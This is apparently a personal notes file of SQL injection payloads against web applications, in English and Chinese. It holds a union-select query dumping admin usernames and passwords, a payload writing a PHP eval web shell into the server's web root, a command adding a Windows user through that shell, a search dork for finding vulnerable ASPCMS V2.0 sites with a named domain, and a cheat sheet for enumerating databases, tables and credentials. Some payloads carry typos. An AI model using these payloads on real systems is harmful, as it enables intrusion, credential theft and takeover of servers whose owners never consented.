# test

192.168.1.2:8080/?id=1 and 1=2 union select 1,concat(username,',',password) from admin

?id=' union select ",",'<?php @eval($_REQUEST[test]);?>' into outfile 'D:\\\phpStudy\\\PHPTutorial\\\WWW\\\shop\\\502g58de\\\test.php'%23

/test.php?test=system('net user myusername mypwd /add');

# test2

百度关键词: {有限公司\学校\医院\xxx}--Powered by ASPCMS V2.0

在找到的链接后边添加index.asp  /admin_aspcms/login.jsp  /admin/login.jsp 

​	如: http://bzschz.org/  → http://bzschz.org/index.asp

​	如:  http://bzschz.org/index.html  → http://bzschz.org/index.asp

​	?id=0 or 1=1(?id=1%20and%201=1) 可以判断是否有注入漏洞

?id=0%20unmasterion%20semasterlect..

# test3

- ?id=1 order by 1,2  	--通过第几列排序 **可拿到查询了几个字段**
- ?id=1 and 1=2 union select 1,2
  - 让原sql报错,执行自己的sql
- 例子:
  - ?id=1 and 1=2 union select 1,datbase() 
  - 猜询数据库版本: and 1=2 union select 1, version()
  - 猜询数据库: and 1=2 union select 1, (select group concat(schema name)from information schema schemata)
  - 猜询表名: and 1=2 union select 1, table_name from information_schema.tables where table_schema=database()
  - 查询字段名: and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin'
  - 查询字段内容: and 1=2 union select 1, concat(username, '', password) from admin

